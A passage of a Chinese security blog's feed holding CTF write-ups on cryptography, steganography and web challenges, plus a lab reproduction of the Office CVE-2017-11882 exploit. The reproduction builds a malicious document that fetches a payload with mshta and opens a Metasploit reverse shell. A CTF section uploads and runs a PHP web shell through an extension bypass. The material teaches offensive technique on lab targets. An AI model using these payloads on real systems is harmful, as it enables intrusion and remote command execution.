class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-19 21:41 CST</span><br><span class="line">Nmap scan report for 226.187.154.104.bc.googleusercontent.com (104.154.187.226)</span><br><span class="line">Host is up (0.22s latency).</span><br><span class="line">Not shown: 996 filtered ports</span><br><span class="line">PORT     STATE  SERVICE</span><br><span class="line">22/tcp   open   ssh</span><br><span class="line">80/tcp   closed http</span><br><span class="line">5901/tcp closed vnc-1</span><br><span class="line">9418/tcp open   git</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 17.20 seconds</span><br></pre></td></tr></table></figure></p><p>开放ssh和git，直接<code>git clone git://104.154.187.226/huuuuuge</code>失败，参考这个<a href="https://askubuntu.com/questions/460885/how-to-clone-git-repository-only-some-directories" target="_blank" rel="noopener">链接</a><br>用以下命令，正好题目说不要思考太深.<br><code>git clone --depth 1 git://104.154.187.226/huuuuuge</code></p><h2 id="RC4-took-an-L"><a href="#RC4-took-an-L" class="headerlink" title="RC4 took an L"></a>RC4 took an L</h2><p><a href="https://github.com/dstein64/LC4/blob/master/documentation.md" target="_blank" rel="noopener">https://github.com/dstein64/LC4/blob/master/documentation.md</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">In [1]: import lc4</span><br><span class="line"></span><br><span class="line">In [2]: key  = &quot;pq_xc589r3nb#mgjtkh7w2dlfvy4eaoi6uzs&quot;</span><br><span class="line"></span><br><span class="line">In [3]: encrypted = &quot;wpwt#5ng4_qbitp#8mq59r_g866c4t59c6vy6tisj4af6bprfnbd_wrq2wjmr4ld_s26a7i#biiyqjolq8lus_wfus</span><br><span class="line">   ...: fkj8xv2qrrv3etab_marovc#uuoueyl&quot;</span><br><span class="line"></span><br><span class="line">In [4]: decrypted = lc4.decrypt(key,encrypted)</span><br><span class="line"></span><br><span class="line">In [5]: print(decrypted)</span><br><span class="line">i_hope_that_by_making_this_long_you_will_assume_substitution_cipher_and_go_to_quip_qiup_the_flag_is#elsie_four_is_not_rc4</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Trippy&quot;&gt;&lt;a href=&quot;#Trippy&quot; class=&quot;headerlink&quot; title=&quot;Trippy&quot;&gt;&lt;/a&gt;Trippy&lt;/h2&gt;&lt;p&gt;&lt;code&gt;strings be37fef78cfd6c7deda71154f567e6d0cfefbda1
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://threst.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>网鼎杯wp</title>
    <link href="https://threst.github.io/2018/10/04/%E7%BD%91%E9%BC%8E%E6%9D%AFwp/"/>
    <id>https://threst.github.io/2018/10/04/网鼎杯wp/</id>
    <published>2018-10-04T05:32:13.000Z</published>
    <updated>2018-10-04T07:22:29.818Z</updated>
    
    <content type="html"><![CDATA[<h2 id="网鼎杯wp"><a href="#网鼎杯wp" class="headerlink" title="网鼎杯wp"></a>网鼎杯wp</h2><h2 id="套娃"><a href="#套娃" class="headerlink" title="套娃"></a>套娃</h2><p>打开文件看见很多图片,首先判断lsb,用工具zsteg,一张一张试，试到第六张<code>zsteg 6.png</code><br>出flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">imagedata           .. text: &quot;-+,554$&amp;&amp;&quot;</span><br><span class="line">b1,rgb,lsb,xy       .. text: &quot;^;lI;bN$&quot;</span><br><span class="line">b1,bgr,lsb,xy       .. text: &quot;+flag&#123;03a253f5-8e93-4533-bcfc-af908830095d&#125;\nq&quot;</span><br><span class="line">b2,b,msb,xy         .. file: Encore - version 8432</span><br><span class="line">b4,r,lsb,xy         .. text: &quot;iEsx\&quot;gwN)&quot;</span><br><span class="line">b4,g,lsb,xy         .. text: &quot;yEsx\&quot;gwN)&quot;</span><br><span class="line">b4,b,msb,xy         .. text: &quot;&#123;OL?i9Ww&quot;</span><br></pre></td></tr></table></figure></p><h3 id="babyrsa"><a href="#babyrsa" class="headerlink" title="babyrsa"></a>babyrsa</h3><p>首先求出q,p<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">   <span class="keyword">if</span> a &lt; b:</span><br><span class="line">     a, b = b, a</span><br><span class="line">   <span class="keyword">while</span> b != <span class="number">0</span>:</span><br><span class="line">     temp = a % b</span><br><span class="line">     a = b</span><br><span class="line">     b = temp</span><br><span class="line">   <span class="keyword">return</span> a</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getpq</span><span class="params">(n,e,d)</span>:</span></span><br><span class="line">  p = <span class="number">1</span></span><br><span class="line">  q = <span class="number">1</span></span><br><span class="line">  <span class="keyword">while</span> p==<span class="number">1</span> <span class="keyword">and</span> q==<span class="number">1</span>:</span><br><span class="line">    k = d * e - <span class="number">1</span></span><br><span class="line">    g = random.randint ( <span class="number">0</span> , n )</span><br><span class="line">    <span class="keyword">while</span> p==<span class="number">1</span> <span class="keyword">and</span> q==<span class="number">1</span> <span class="keyword">and</span> k % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">      k /= <span class="number">2</span></span><br><span class="line">      y = pow(g,k,n)</span><br><span class="line">      <span class="keyword">if</span> y!=<span class="number">1</span> <span class="keyword">and</span> gcd(y<span class="number">-1</span>,n)&gt;<span class="number">1</span>:</span><br><span class="line">        p = gcd(y<span class="number">-1</span>,n)</span><br><span class="line">        q = n/p</span><br><span class="line">  <span class="keyword">return</span> p,q</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">  n =<span class="number">365848589691553391654453815696801609393691558975114732077589431735072735814004481321693204054611153742844719038444697593327493027785795731389621927670788503335861977736740530534583572225955976966446771693720421426616666151538067479984725761741317847115913974275314572559550814811157603376899910638368755166255776849626761808720772583206050387900451906315871548607212450421821284358760939660687558588799753487824506759639032283177034815892289194765173975342074810666614953387403646634191147782168926568900983361174986224868620163303631776464544385042160475855173792780028858673004579549168611488908206940265042017827224145445864849990033230038346962998044409425059655414595541354712964867076540952852074402602485254837693009606256646491881886402251519107628767780560029195077356603998621239496833842620813594476086809217145741837067697701029006079475655230057641122885601163764359304119539318186498359110652713132230601632984636292710845264886583673643096710521658506038045125724977714211793704349604343253187208130136333839351343850952892593409667791896415744436543839302830842902421646274217466522255794836216649020356914498443158290307092169834254304137975684324590877396301465368942446331758175055737212871262544202124864201404357</span> </span><br><span class="line">  e = <span class="number">65537</span></span><br><span class="line">  d = <span class="number">171667543985758425014232627985840717336387122108163758500542139626729279212540485673813409388397427405892256280730752710530037468765259171638824687119216443453078833931370749271396524300663719786871097595637432285751800013612137436020725492852419342272435212733486026753609513054804440530485467017884797272879406284689903095072725307517165288748564887361729738358011463377509622604034612759898436024272853796444439505507110804160400608180412245257162062494766079887998276493727771202445125297118556385657613871902180087388189988280105656191733965985878495407148701887047735812018200868151321246119065258205755102189932618492331181731032930671506379119003614308043854723142913145153824556828017544028126772950732350030371733003652817854070184981540813302478821473998511699291112000260313162924676245915026226201977284465842505256191235822318812659628683043195357384607192367037650400361829016395922074065034014120534209020328864830006606839179592932609256661738193663329776230050481312159600570791315455079679469956882283489829258240404557309270261381865785081719442470884775430068193960751589033994677379472095235901602941733635505402949964622214247924792042997962235246007680923289071880896909708764598890244005005286926994431628289</span></span><br><span class="line">  p,q = getpq(n,e,d)</span><br><span class="line">  <span class="keyword">print</span> hex(p),hex(q)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">  main()</span><br></pre></td></tr></table></figure></p><p>然后将enc保存起来为en文件<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">n = <span class="number">365848589691553391654453815696801609393691558975114732077589431735072735814004481321693204054611153742844719038444697593327493027785795731389621927670788503335861977736740530534583572225955976966446771693720421426616666151538067479984725761741317847115913974275314572559550814811157603376899910638368755166255776849626761808720772583206050387900451906315871548607212450421821284358760939660687558588799753487824506759639032283177034815892289194765173975342074810666614953387403646634191147782168926568900983361174986224868620163303631776464544385042160475855173792780028858673004579549168611488908206940265042017827224145445864849990033230038346962998044409425059655414595541354712964867076540952852074402602485254837693009606256646491881886402251519107628767780560029195077356603998621239496833842620813594476086809217145741837067697701029006079475655230057641122885601163764359304119539318186498359110652713132230601632984636292710845264886583673643096710521658506038045125724977714211793704349604343253187208130136333839351343850952892593409667791896415744436543839302830842902421646274217466522255794836216649020356914498443158290307092169834254304137975684324590877396301465368942446331758175055737212871262544202124864201404357</span></span><br><span class="line">q = <span class="number">21247215740957134093265550307601596334565934182288901633479787419858595507309542143291010899116196305518233534420568241312971809880837699847400521241640799368655041150575554308730271881769239094444859039192040949365669348829967204647597799647400611871600471392643211141324508902013965629910849583588860496396894218207070653018491227851599590460886901861118814380124225957234489558977546955544744088926474539812805322440263336981775000388601318263891815294818558967365443417213622344902893006222500539208416032217024199412011407065597780149434489493090516057515224711817526865207811206081845018578244352022299726352429</span></span><br><span class="line">p = <span class="number">17218660277747658661570321204242764803630206984608091050735513899954607259990197682920217962729554631925287717895042750367376053893825222669682720379767777978420372647078471394057423219108293122309702127813213538098587207320396013417905225613995163882055903136983578393368677405597005083234898687252223168153402377438770956193242614092327835450469896527227274247481162714635222596608814392174415700802919488373733075163465872659516094599061925501245246745540660613671330140533678955280470168225630164182057506377339944396256899408381867150087697255700045339651723565686838745271371156317781031620433061297464511939833</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = int(gmpy2.invert(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>)))</span><br><span class="line">c = <span class="number">595907910014897566676759273220494180110504405309206928262077375196851872198255475894354731091152236001815566589109149418500941957601976338444865345923284445575231525767013366811625019790193104404700935059348406110259409132999154793422284855871479573037198863168316139619015230842153164456415165712733168847053549666987429231550045602429647190887296150436097504253951033086041023290243394588112378415597355331197477353268041702315544498517593435582803377846605416492328428549762726997373778610297631262936044023082133389527010183648204602019909093544050106545010340111158865651714595416550877266379460461202508425081538939755155981052462387069127219471271252329219741973931444515475042747296537826297597609877185091023146800772255931184176842795811493106605043628420424570356086529035683658247137732622727936360278626896359520245649007121507751791963774871011757969835056581831379451191486773951068884218824708768124265822406883125206366165049254095060850508149142077001002691653724105471247840338330950732651135526020758912039445132132220384552395727000975811496722746325764235912590648009260905626046623587310131509221213855320504560598181447448347942432104726593025899197575968063366667049857458434444589861188997071804152577554008432377364384618217386050104523193905875708680446628674323881765587061198043253617150813946435891423000351453751011920626958050766691194569988935791651947014346084202733308461380228052483711867634858130530821103064974133728497007084932069068016812055942718671316269862791929104093268433719717198448532384887239504852113742140342891243245503616771575963935904547388496016245046067614357190925132118951805544371988522892491794366705168091658</span></span><br><span class="line">privatekey = rsa.PrivateKey(n,e,d,p,q)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"en"</span>,<span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    print(rsa.decrypt(base64.b64decode(f.read()),privatekey).decode())</span><br></pre></td></tr></table></figure></p><p>得到flag<br><code>flag{w3lC0M3_t0_rS4_w0RlD}</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;网鼎杯wp&quot;&gt;&lt;a href=&quot;#网鼎杯wp&quot; class=&quot;headerlink&quot; title=&quot;网鼎杯wp&quot;&gt;&lt;/a&gt;网鼎杯wp&lt;/h2&gt;&lt;h2 id=&quot;套娃&quot;&gt;&lt;a href=&quot;#套娃&quot; class=&quot;headerlink&quot; title=&quot;套娃&quot;&gt;&lt;/a&gt;套
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://threst.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2017-11882复现</title>
    <link href="https://threst.github.io/2018/09/18/cve-2017-11882/"/>
    <id>https://threst.github.io/2018/09/18/cve-2017-11882/</id>
    <published>2018-09-18T05:34:14.000Z</published>
    <updated>2018-09-18T05:42:35.645Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-漏洞简介"><a href="#0x00-漏洞简介" class="headerlink" title="0x00 漏洞简介"></a>0x00 漏洞简介</h2><p>2017年11月14日，微软发布了11月份的安全补丁更新，其中比较引人关注的莫过于悄然修复了潜伏17年之久的Office远程代码执行漏洞（CVE-2017-11882）。该漏洞为Office内存破坏漏洞，影响目前流行的所有Office版本。攻击者可以利用漏洞以当前登录的用户的身份执行任意命令。 由于漏洞影响面较广，漏洞披露后，金睛安全研究团队持续对漏洞相关攻击事件进行关注。11月19日，监控到了已有漏洞POC在网上流传，随即迅速对相关样本进行了分析。目前该样本全球仅微软杀毒可以检测。</p><ul><li>漏洞影响版本：</li><li>Office 365</li><li>Microsoft Office 2000</li><li>Microsoft Office 2003</li><li>Microsoft Office 2007 Service Pack 3</li><li>Microsoft Office 2010 Service Pack 2</li><li>Microsoft Office 2013 Service Pack 1</li><li>Microsoft Office 2016</li></ul><h2 id="0x01-利用工具清单："><a href="#0x01-利用工具清单：" class="headerlink" title="0x01 利用工具清单："></a>0x01 利用工具清单：</h2><p>a) tcp反弹：kali 192.168.1.5<br>b) 安装office2016的系统：win7 192.168.1.7</p><h2 id="0x02-利用过程"><a href="#0x02-利用过程" class="headerlink" title="0x02 利用过程"></a>0x02 利用过程</h2><h3 id="下载poc"><a href="#下载poc" class="headerlink" title="下载poc"></a>下载poc</h3><p><a href="https://github.com/Ridter/CVE-2017-11882" target="_blank" rel="noopener">github</a></p><h3 id="生成msf利用的doc"><a href="#生成msf利用的doc" class="headerlink" title="生成msf利用的doc"></a>生成msf利用的doc</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">threst@threst:~/Pentest/poc/CVE-2017-11882$ python Command43b_CVE-2017-11882.py -c &quot;mshta http://192.168.1.5:8080/abc&quot; -o cve.doc</span><br><span class="line">[*] Done ! output file --&gt; cve.doc</span><br><span class="line">threst@threst:~/Pentest/poc/CVE-2017-11882$ sudo cp cve.doc /var/www/html/</span><br></pre></td></tr></table></figure><h3 id="msf配置Poc："><a href="#msf配置Poc：" class="headerlink" title="msf配置Poc："></a>msf配置Poc：</h3><p>开启metasploit<br><code>msfconsole</code><br>使用11882模块<br><code>use exploit/windows/smb/cve-2017-11882</code><br>设置payload<br><code>set payload windows/meterpreter/reverse_tcp</code></p><p>设置选项<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(windows/smb/cve-2017-11882) &gt; set lhost 192.168.1.5</span><br><span class="line">lhost =&gt; 192.168.1.5</span><br><span class="line">msf exploit(windows/smb/cve-2017-11882) &gt; set URIPATH abc</span><br><span class="line">URIPATH =&gt; abc</span><br><span class="line">msf exploit(windows/smb/cve-2017-11882) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/cve-2017-11882):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0</span><br><span class="line">   SRVPORT  8080             yes       The local port to listen on.</span><br><span class="line">   SSL      false            no        Negotiate SSL for incoming connections</span><br><span class="line">   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)</span><br><span class="line">   URIPATH  abc              no        The URI to use for this exploit (default is random)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &apos;&apos;, seh, thread, process, none)</span><br><span class="line">   LHOST     192.168.1.5      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf exploit(windows/smb/cve-2017-11882) &gt; exploit </span><br><span class="line">[*] Exploit running as background job 0.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.5:4444 </span><br><span class="line">[*] Using URL: http://0.0.0.0:8080/abc</span><br><span class="line">msf exploit(windows/smb/cve-2017-11882) &gt; [*] Local IP: http://192.168.1.5:8080/abc</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Place the following DDE in an MS document:</span><br><span class="line">mshta.exe &quot;http://192.168.1.5:8080/abc&quot;</span><br><span class="line">[*] 192.168.1.7      cve-2017-11882 - Delivering payload</span><br><span class="line">[*] Sending stage (179779 bytes) to 192.168.1.7</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.1.5:4444 -&gt; 192.168.1.7:58478) at 2018-09-18 13:16:55 +0800</span><br></pre></td></tr></table></figure></p><p>win7用360极速浏览器打开<code>http://192.168.1.5:8080/abc</code></p><p><img src="https://i.loli.net/2018/09/18/5ba08b7ad6eba.jpg" alt=""></p><p><img src="https://i.loli.net/2018/09/18/5ba08b7aa16a8.jpg" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(windows/smb/cve-2017-11882) &gt; sessions -i 1 </span><br><span class="line">[*] Starting interaction with 1...</span><br><span class="line"></span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 1440 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows [�汾 6.1.7601]</span><br><span class="line">��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����</span><br><span class="line"></span><br><span class="line">C:\Users\threst\AppData\Local\360Chrome\Chrome\Application\9.5.0.138&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">threst-pc\threst</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/i-honey/p/7885573.html" target="_blank" rel="noopener">https://www.cnblogs.com/i-honey/p/7885573.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-漏洞简介&quot;&gt;&lt;a href=&quot;#0x00-漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;0x00 漏洞简介&quot;&gt;&lt;/a&gt;0x00 漏洞简介&lt;/h2&gt;&lt;p&gt;2017年11月14日，微软发布了11月份的安全补丁更新，其中比较引人关注的莫过于悄
      
    
    </summary>
    
    
      <category term="CVE-2017-11882" scheme="https://threst.github.io/tags/CVE-2017-11882/"/>
    
  </entry>
  
  <entry>
    <title>noxctf2018wp</title>
    <link href="https://threst.github.io/2018/09/15/noxctf2018wp/"/>
    <id>https://threst.github.io/2018/09/15/noxctf2018wp/</id>
    <published>2018-09-15T05:34:14.000Z</published>
    <updated>2018-09-18T05:44:34.577Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>题目</p><blockquote><p>What is your reference again?<br><a href="http://chal.noxale.com:5000" target="_blank" rel="noopener">http://chal.noxale.com:5000</a></p></blockquote><p>提示我改这个<code>Referer</code></p><p><img src="https://i.loli.net/2018/09/09/5b951e2db1219.png" alt=""></p><p>我就用Firefox的改包重发改成<code>/check_from_google</code></p><p><img src="https://i.loli.net/2018/09/09/5b951e2dca83d.png" alt=""></p><p><code>bm94Q1RGe0cwb2dMM18xc180bFc0WXNfVXJfYjNTVF9SM2YzcjNuYzN9</code></p><p>base64解密下</p><p>flag:<code>noxCTF{G0ogL3_1s_4lW4Ys_Ur_b3ST_R3f3r3nc3}</code></p><h2 id="MyFileUploader"><a href="#MyFileUploader" class="headerlink" title="MyFileUploader"></a>MyFileUploader</h2><p>题目</p><blockquote><p>This is my new file uploader server. I bet you can’t hack it!<br><a href="http://chal.noxale.com:8079" target="_blank" rel="noopener">http://chal.noxale.com:8079</a></p></blockquote><p>打开链接，可以上传文件，随便写个文件试试。<br><code>shell.php</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">system($_GET[&apos;cmd&apos;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/09/10/5b9602239f358.png" alt=""></p><p>提示失败，要图片类型才可以，经过几次尝试之后，把<code>shell.php</code>改成<code>shell.png.txt</code>上传试试，</p><p><img src="https://i.loli.net/2018/09/10/5b9602a635b95.png" alt=""></p><p>居然可以！访问下，但是没有解析，看看<code>uploads</code>有些什么，发现一个<code>Don&#39;t open</code>文件夹，他说不打开就不打开吗？可以要打开看看。</p><p><img src="https://i.loli.net/2018/09/10/5b9604668b06d.png" alt=""></p><p><img src="https://i.loli.net/2018/09/10/5b96046667e77.png" alt=""></p><p><code>AddType application/x-httpd-php .cyb3r</code>看样子只有<code>.cyb3r</code>才可以解析，把文件改成这个试试。</p><p><img src="https://i.loli.net/2018/09/10/5b96084b08caf.png" alt=""></p><p>成功了！这个文件很奇怪打开看看</p><p><code>curl &quot;http://chal.noxale.com:8079/uploads/shell.png.cyb3r?cmd=ls%207H3-FL4G-1S-H3r3&quot;</code></p><p><img src="https://i.loli.net/2018/09/10/5b9608dfb47f9.png" alt=""></p><p>flag:<code>noxCTF{N3V3R_7RU57_07H3R5}</code></p><h2 id="Read-Between-The-Lines"><a href="#Read-Between-The-Lines" class="headerlink" title="Read Between The Lines"></a>Read Between The Lines</h2><p>题目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">My boss promised me that he would give me a raise if I solve his challenge.</span><br><span class="line">Have I already mentioned I suck in challenges?</span><br></pre></td></tr></table></figure></p><p>下载下来一个<code>message.code</code>,linux下打不开，不急，file试一下，提示<code>gzip</code>，把他后缀名改成<code>gz</code>就可以打开了。<br>打开后是这样的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+